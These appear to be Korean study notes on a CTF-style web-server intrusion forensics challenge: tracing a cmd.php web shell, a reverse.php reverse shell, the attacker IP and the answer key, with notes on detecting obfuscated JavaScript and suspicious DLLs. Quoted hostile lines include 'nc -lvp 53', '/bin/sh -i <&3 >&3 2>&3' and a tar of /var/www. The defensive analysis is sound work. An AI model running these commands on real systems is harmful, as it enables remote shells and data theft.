문제 접근방법은 C -> B -> A 순서

Sublime Text

netstat -an



웹서비스 개발 운영 환경에 php, java, Python의 장고이면 공격자도 그에 맞는 언어로 개발된 악성파일로 공격함

공격자는 80, 8080, 53번 등의 WellKnown 포트를 열고 대기함
nc -lvp 53 (53번 포트 열고 대기)

피해자가 공격자한테 연결을 시도하면 연결이 맺어짐


LISTEN: 연결 대기중
ESTABLISHED: 연결 됨


출발하는 건 랜덤한 포트를 열기 때문에 WelKnown 포트가 아니라 아무 포트(40912, 3541 등)을 열 수 있음
도착하는 건 

1. access.log에서 /upload/editor/image 검색 72747? 의 이녀석을 유심히 함 보기
	1. 왜 /upload/editor/image를 검색하냐면 /var/www가 홈 디렉토리 이기 때문임
	2. 검색하다보면 /upload/editor/image/cmd.php 이런 게 나옴 그래서 cmd.php를 검색해보면
	3. cmd=cHdk가 나옴 -> pwd, cmd=bHMgLWFsICAvdmFyL3d3dy91cGxvYWQvZWRpdG9yL2ltYWdlLw%20%20 -> ls -al  /var/www/upload/editor/image/ image에 어떤 파일들이 있는지 나옴
	4. tar -cvf /var/www/upload/editor/image/1330664838 /var/www/
2. pstree_a 에서 /var/www/upload/editor/image/reverse.php -> 에서 보면 image에 reverse.php 
	1. -sh -c /bin/sh -i <&3 >&3 2>&3 => 이뇨속 딱 봐도 공격자네? ps_eaf에서 /bin/sh를 보니까 5248!
3. 출발포트는 랜덤이기 때문에 다른 포트번호와 확연히 다른 포트가 있으면 의심할 수 있음 => 144.206.162.21:80 이 공격자 IP, 
4. 

ostermiller


cmd.php가 나온 줄
- 81095 -> 별 거 없음
- 81096 -> cmd=cHdk => pwd
- 81105 -> cmd=bHMgLWFsICAvdmFyL3d3dy91cGxvYWQvZWRpdG9yL2ltYWdlLw => ls -al  /var/www/upload/editor/image/
- 81122 -> cmd=dGFyIC1jdmYgL3Zhci93d3cvdXBsb2FkL2VkaXRvci9pbWFnZS8xMzMwNjY0ODM4IC92YXIvd3d3Lw
	- => tar -cvf /var/www/upload/editor/image/1330664838 /var/www/
- 81141 -> cmd cGhwIC1mIC92YXIvd3d3L3VwbG9hZC9lZGl0b3IvaW1hZ2UvcmV2ZXJzZS5waHA
	- => php -f /var/www/upload/editor/image/reverse.php
	- \[25/Aug/2012:17:26:40 +0900] 시간은 이거 아닐까 싶네요

- 81127 


2012/08/25-17:26:40

2012/08/25-17:23:02


1330664838가 나온 줄
- 25300 - /upload/editor/image/1330664838.png를 가져옴


### 문제 ###
이벤트예약 웹사이트를 운영하고 있는 "깜짝이야"사의 관리자 앞으로 한 통의 협박 메일이 도착했다.
당장 10억을 입금하지 않으면, 확보한 자사의 웹페이지 소스코드를 모두 공개할 것이며,
추가적인 위협을 가하겠다는 내용이다.
관리자는 포렌직 전문가인 당신에게 침해사고 분석을 의뢰하였다.
침해된 시스템에 남겨진 흔적과 각종 로그파일을 분석하여 다음 사항을 밝혀내시오.


A. 공격자가 웹페이지 소스코드를 유출한 시간(UTC+09:00)은 ? (yyyy-MM-dd_hh:mm:ss) 
access.log
B. 리버스쉘(Reverse Shell)을 동작시키는 프로세스 ID(PID)는 ? (10진수) 
pstree_a -> ps_eaf
C. 리버스쉘(Reverse Shell)에 대한 공격자 주소(IP)는 ? 
netstat_an


답 입력 : yyyy-MM-dd_hh:mm:ss_5248_144.206.162.21
정답 : 2012-08-25_17:23:02_5248_144.206.162.21


### 풀이과정 ###
C->B->A 순서로 진행함

C. 리버스쉘(Reverse Shell)에 대한 공격자 주소(IP)는 ? 
netstat_an




질문
- 81141을 보면 디코딩 했을 때 reverse.php를 실행시키는 명령어가 나오고 그 앞에서 GET 으로 압축파일을 탈취하는 명령어가 나옴
  그냥 GET 요청으로 /var/www/를 압축한 파일을 탈취했다면 뒤에 나오는 reverse.php는 왜 하는 것인가? 이미 탈취는 했는데

해결!


#### 1. javascript excape() 우회 기법 ####
- 정규표현식(RegExr)을 활용한 필터 방법
- ex. %u03eb%ueb59%ufff8%u4949%u6b42
	- 표현식 작성: %u\[a-f,0-9](4) 
		- -> %u로 시작하고, 알파벳은 a-f 사이, 숫자는 0-9 사이로 4바이트인 것만 체크함

#### 2. JavaScript eval() 우회 기법 ####
- 정규표현식(RegExr)을 활용한 필터 방법
- ex. \x76\x61\x2E\x6F
	- 표현식 작성: \\x\[0-9, A-F]{2}
		- -> \x로 시작하고, 알파벳은 A-F 사이, 숫자는 0-9 사이로 2바이트인 것만 체크함







# 책 내용 #


# 침해사고의 흔적들 #


## 윈도우/리눅스 주요 아티팩트 ##


아티팩트: 흔적이라는 단어만으로 번역하기에는 전체 의미가 축소되기 때문에 번역없이 '아티팩트'라고만 부름






비정상적인 프로세스 정보
- 실행중인 프로세스 디렉토리를 추적
- 프로세스 상세 정보 확인 - 설명, 회사 이름 등 정보로 추측 가능 (공격자 입장에서 이런 것들까지 신경쓰기에 ROI가 안 나와서 이 부분이 이상할 때가 있음)
- 임시 폴더에서 실행중인 프로세스 확인 - 대부분의 악성코드가 이 공간을 활용함
	- 실행중인 프로세스가 임시 폴더의 DLL을 가리키는 경우도 악성코드임
	- -> 악성 DLL이 임시 폴더에 있고 프로세스가 임시 폴더의 DLL을 가리키면 쎄함이 느껴지면서 악성코드 의심해볼 수 있음
	- 마이크로소프트에서 만든 DLL은 따로 전자 서명이 있는데 악성 DLL은 전자 서명이 없기 때문에 서명이 확인 안 되면 악성 DLL일 가능성이 있음



Process Explorer을 다운 받았을 때 이걸로 프로세스들과 프로세스가 사용하는 DLL도 확인할 수 있음
- dll을 확인하고 싶으면 View -> Lower Panel View -> DLLs 를 하면 아래에 패널이 하나 보임
- 아무 dll이나 더블클릭하면 해당 dll의 속성이 보이는데 여기서 Load Address 옆의 Verify를 누르면 Company의 (Verified)가 안 뜨면 악성dll로 의심해볼 수 있음
- 악성 사용자는 자동 실행을 좋아하기 때문에 자동 실행으로 되어 있어도 악성으로 의심해볼 수 있음








ARP cast poisoning의 특징은 

ip주소는 다르지만 mac 주소는 같아지게 되어서 


















































